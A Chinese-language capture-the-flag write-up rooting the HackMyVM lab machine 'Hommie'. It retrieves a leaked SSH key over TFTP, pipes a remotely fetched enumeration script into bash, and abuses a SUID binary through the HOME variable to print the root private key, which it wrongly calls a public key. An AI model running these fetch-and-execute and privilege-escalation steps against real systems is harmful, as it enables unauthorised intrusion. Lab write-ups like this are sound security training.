# Hommie

2024-11-04 https://hackmyvm.eu/machines/machine.php?vm=Hommie

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

访问 http://192.168.5.40/ 发现提示：

```
alexia, Your id_rsa is exposed, please move it!!!!! Im fighting regarding reverse shells! -nobody
```

发现用户名 alexia 提示 id_rsa 已经暴露

看 ftp 允许匿名登陆，发现 2 个目录，但是文件里面都没内容：

```
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .web
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
```

发现 .web 目录中的 index.html 文件显示的内容与下面的 80 端口显示的一致，说明这里是 web 目录，尝试上传 web shell 后，但是 php 脚本不能执行，这个方向行不通。对 web 进行目录扫描也没发现有用的信息。

使用 nmap 对目标机器进行 udp 扫描，看看是否有开放端口:

```
sudo nmap -sU --min-rate 10000 --top-ports 20 -Pn 192.168.5.40
```

发现 tftp 可能端口开放，尝试连接 tftp 192.168.5.40 但是 tftp 不能 list 文件列表，尝试用上面说的 id_rsa 泄露这个文件名去 get id_rsa 发现可以下载。

使用此 id_rsa 进行登陆，得到 user flag:

```
alexia@hommie:~$ cat user.txt
Imnotroot
```

使用 linpeas 找到提升至 root 的路径：

```
wget -q -O - http://192.168.5.3/scripts/lin/enum/peas.sh|bash
```

发现了 suid 程序 /opt/showMetheKey，使用 strings 对其进行分析，发现读取 id_rsa 的命令：

```
cat $HOME/.ssh/id_rsa
```

将 HOME 设置成 /root 就可以读取 root 下的 rsa 公钥文件：

```
HOME=/root

/opt/showMetheKey
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvBYog1I3rTTmtMw6i7oPRYy7yj8N6zNT3K9QhalnaTF+Md5NjbX5
hhNfZjO0tNbMGEeJtNTc3FpYWcAujrrd3jO5MzHUWAxQoyYYrZOFj2I5Fz/0RxD7e89H11
5nT7+CSUeddP/UeoyvSPgaruwrwD+dUl7+GiXo3sc5vsq3YufTYh1MlMKb/m7KmVk5n4Tk
/IFJwuuc3U4OZiRwXOmK4W2Gfo0Fonu6vFYmhpcCsi7V8g3hpVmOZIU8ZUtG1YbutCVbOC
EGyc1p5nbnyC0IIF5Y2EhjeevX8gmj4Kdv/y6yuvNdsJKm+ed2EEY9AymmPPwIpQshFwKz
Y0yB8N1jkQAAA8BiCyR9YgskfQAAAAdzc2gtcnNhAAABAQC8FiiDUjetNOa0zDqLug9FjL
vKPw3rM1Pcr1CFqWdpMX4x3k2NtfmGE19mM7S01swYR4m01NzcWlhZwC6Out3eM7kzMdRY
DFCjJhitk4WPYjkXP/RHEPt7z0fXXmdPv4JJR510/9R6jK9I+Bqu7CvAP51SXv4aJejexz
m+yrdi59NiHUyUwpv+bsqZWTmfhOT8gUnC65zdTg5mJHBc6YrhbYZ+jQWie7q8ViaGlwKy
LtXyDeGlWY5khTxlS0bVhu60JVs4IQbJzWnmdufILQggXljYSGN569fyCaPgp2//LrK681
2wkqb553YQRj0DKaY8/AilCyEXArNjTIHw3WORAAAAAwEAAQAAAQA/OvPDshAlmnM0tLO5
5YLczsMS6r+zIj4/InDffmPVaV4TRbisu1B3Umvv39IQOWXDg8k3kZfuPDEXexQrx4Zu/N
R18XqBXyJ8toH1WHK+ETdAKa/ldEAXD0gHjyUMGkWifQDiJF86E7GZxk6yH5NVvg0Vc/nY
sIXo3vD6wwuDo/gj+u4RRYMH3NYkLSj/O67cxGXnTOZPGzGsFTrE218BNtNqbRBR9/immU
irjugqebxY135Z4oECe/Hv4mP2e7n5QVO8FnYklQ4YU6y0ZTAMtjZCAhslXSKvaJPLjXuk
/HpdYhSoojm3vTAq/NT/oir0wA2ZYGdnF/Bxm6v/mntBAAAAgF2pqZEe9UqzcsAfOujr6z
DMRgPpl8qsdhDz6aftdg24AYmgXJ1D7PWUDpU6puO3VxJGrOwvcgD6xELRTxeFjd/2ssrh
4OO/kTvK4K0WVB/bnZ4y724iLcThfHDbzTTc5ckn45tyso8540iKha5ay1i24GwRPWddie
B/qcB1bHNOAAAAgQDmmptuwTRwUSiU1NtZRnJFvxvzLw6Wy/Cb2G+n5KY0ce5cYHT2HSIr
zsbPaDXQNBFy4iu1DAXAJJXTrxjOaAeLVYSb/8eZ1dhcgkxoAC8i2l6NwNmsjhGQKv++fV
qMfIdzVmriLXBZf7DU97YZeDIOrdOOV5CHhq+37i4xNdK18wAAAIEA0Mzc8HYvrXk4ecyi
KXP5u2Zxw2LADJ8DFeKWZmCUuNKFD1TuqdauxKxIVKVDaHvcnEr1bOiEBBso/X1CCtKjE+
12ZOWvqZ4fORxiNs9n/9YxlUSDAw7kyKd9H7dRRFdtb80OgDiwf18tDlEdboGWm/DR0NPq
gmxzbd40GES6DWsAAAALcm9vdEBob21taWU=
-----END OPENSSH PRIVATE KEY-----
```

得到了 root 的公钥文件，使用其进行登陆，最终得到了 root flag：

```
root@hommie:~# find / -type f -name root.txt 2>/dev/null
/usr/include/root.txt
root@hommie:~# cat /usr/include/root.txt
Imnotbatman
```
